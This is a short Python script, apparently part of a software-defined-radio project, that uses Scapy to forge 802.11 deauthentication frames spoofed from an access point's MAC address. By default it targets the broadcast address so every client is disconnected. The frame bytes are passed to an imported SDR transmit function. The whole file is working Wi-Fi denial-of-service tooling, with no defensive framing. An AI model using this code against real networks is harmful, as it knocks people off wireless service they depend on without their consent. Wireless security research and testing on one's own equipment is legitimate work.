from scapy.all import *
from scapy.layers.dot11 import *
from SDRtransmitTCP import transmitData

def deassociation_frame(target_mac, ap_mac):
    # Create a deauthentication frame
    frameFCS = ( 
        Dot11FCS(
            proto = 0,
            type=0,
            subtype=12,
            FCfield = None,
            addr1=target_mac,
            addr2=ap_mac,
            addr3=ap_mac,
            SC=(1 << 4)
            ) /
        Dot11Deauth(reason=3)
    )

    print("Generated Deassociation Frame:")
    print(frameFCS.show())

    return bytes(frameFCS)

def start_deauthentication_frame_generator():
    print("\nstart deauthentication frame generator")
    use_defaults = input("use default values for STA? (deauthentication all devices) (y/n): ")
    AP_mac = ""
    STA_mac = ""

    while(use_defaults not in ["y", "n"]):
        use_defaults = input("Invalid input. Please enter 'y' for yes or 'n' for no: ")
    
    if use_defaults == "y":
        STA_mac = "FF:FF:FF:FF:FF:FF"    
    elif use_defaults == "n":
        STA_mac = input("Enter the STA MAC address: ")
    
    AP_mac = input("Enter the AP MAC address: ")

    raw_frame = deassociation_frame(STA_mac, AP_mac)

    return raw_frame